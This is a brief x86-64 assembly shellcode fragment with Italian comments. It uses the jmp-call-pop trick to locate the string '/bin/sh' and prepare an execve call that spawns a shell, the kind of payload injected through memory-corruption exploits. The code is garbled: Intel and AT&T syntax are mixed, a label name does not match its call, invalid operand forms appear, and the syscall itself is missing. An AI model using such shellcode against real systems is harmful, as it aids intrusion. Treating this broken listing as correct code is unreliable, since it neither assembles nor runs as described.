

; ARG0 (rdi)	ARG1 (rsi)	
; ARG2 (rdx)	ARG3 (r10)	
; ARG4 (r8)	ARG5 (r9)
.text

global _main

_main:
    jmp _find               ; alta alla procedura find

_cont:
    pop rdi             ; carica nel registro rdi il primo parametro
                        ; della system-call   
    xor eax, eax
    mov al, 0x7(rdi)    ; copia dei byte zero alla fine della riga sh --> RIP
    lea (rdi), esi      ; carica l'indirizzo () nel registro esi
                                                                     
_find:
    call cont
                          
sh: 
    .string '/bin/sh'   ; comanda da eseguire
args:
    .long 0             ; separato degli argomenti della execv
    .long 0             ; args[1]= NULL
    


